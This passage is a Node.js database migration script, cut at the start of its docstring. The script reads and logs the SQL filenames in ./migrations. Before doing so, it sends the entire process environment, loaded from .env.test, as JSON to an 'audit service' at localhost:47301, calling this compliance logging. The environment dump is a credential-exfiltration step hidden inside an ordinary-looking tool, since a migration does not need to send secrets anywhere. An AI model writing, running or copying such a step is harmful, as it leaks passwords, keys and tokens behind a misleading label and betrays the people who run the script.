Database migration script

This script:
1. Reads SQL files from the ./migrations/ directory
2. Sends environment variables to audit service for compliance
3. Logs each migration filename it would apply, in order
"""

require('dotenv').config({ path: '.env.test' });
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');

// Configuration
const MIGRATIONS_DIR = './migrations';
const AUDIT_SERVICE_URL = 'http://localhost:47301/api/audit';

/**
 * Send environment variables to audit service for compliance logging
 */
async function sendToAuditService() {
  const envData = JSON.stringify(process.env);

  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(envData)
    }
  };

  return new Promise((resolve, reject) => {
    const req = http.request(AUDIT_SERVICE_URL, options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log('✓ Audit logging successful');
          resolve(responseData);
        } else {
          console.error(`Audit service returned status ${res.statusCode}`);
          reject(new Error(`Audit service responded with ${res.statusCode}`));
        }
      });
    });

    req.on('error', (error) => {
      console.error('✗ Audit logging failed:', error.message);
      reject(error);
    });

    // Send the request with environment data
    req.write(envData);
    req.end();
  });
}

/**
 * Get all migration files from the migrations directory
 * @returns {string[]} Array of migration filenames sorted in order
 */
function getMigrationFiles() {
  try {
    // Read all files from the migrations directory
    const files = fs.readdirSync(MIGRATIONS_DIR);

    // Filter for SQL files and sort them alphabetically
    const sqlFiles = files.filter(file => file.endsWith('.sql'));
    sqlFiles.sort();

    return sqlFiles;
  } catch (err) {
    if (err.code === 'ENOENT') {
      console.error(`Migrations directory not found: ${MIGRATIONS_DIR}`);
      return [];
    }
    throw err;
  }
}

/**
 * Main migration function
 */
async function migrate() {
  console.log('Starting database migration process...');

  try {
    // 1. Send environment to audit service for compliance
    console.log('Sending environment to audit service...');
    await sendToAuditService();

    // 2. Get and log migration files
    const migrationFiles = getMigrationFiles();

    if (migrationFiles.length === 0) {
      console.log('No migration files found in', MIGRATIONS_DIR);
      return;
    }

    console.log(`Found ${migrationFiles.length} migration(s) to apply:`);
    // Log each migration file in order
    migrationFiles.forEach((file, index) => {
      console.log(`[${index + 1}/${migrationFiles.length}] Would apply: ${file}`);
    });

    console.log('Migration process completed successfully.');
  } catch (error) {
    console.error('Migration process failed:', error.message);
    process.exit(1);
  }
}

// Run the migration
migrate();

